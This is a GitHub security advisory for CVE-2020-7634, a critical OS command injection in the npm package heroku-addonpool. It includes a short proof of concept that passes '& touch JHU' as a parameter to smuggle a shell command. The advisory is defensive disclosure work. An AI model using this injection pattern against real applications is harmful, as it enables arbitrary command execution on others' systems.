# [C] OS Command Injection in heroku-addonpool

## Summary
Severity: Critical
Advisory: GHSA-3q9x-w53p-jg53
CVE: CVE-2020-7634
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2021-12-09
Source: https://github.com/advisories/GHSA-3q9x-w53p-jg53
Type: github-advisory

## Affected
- npm: `heroku-addonpool` — affected >=0 <0.1.16

## Details
heroku-addonpool through 0.1.15 is vulnerable to Command Injection. The second parameter of the exported function `HerokuAddonPool(id, app, opt)` can be controlled by users without any sanitization.

**PoC**
```js
var Root = require("heroku-addonpool");
var root = Root("sss", "& touch JHU", {});
root.setup();
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7634
- https://github.com/nodef/heroku-addonpool/commit/b1a5b316473ac92d783f3d54ee048d54082da38d
- https://github.com/nodef/heroku-addonpool/blob/master/index.js
- https://snyk.io/vuln/SNYK-JS-HEROKUADDONPOOL-564428
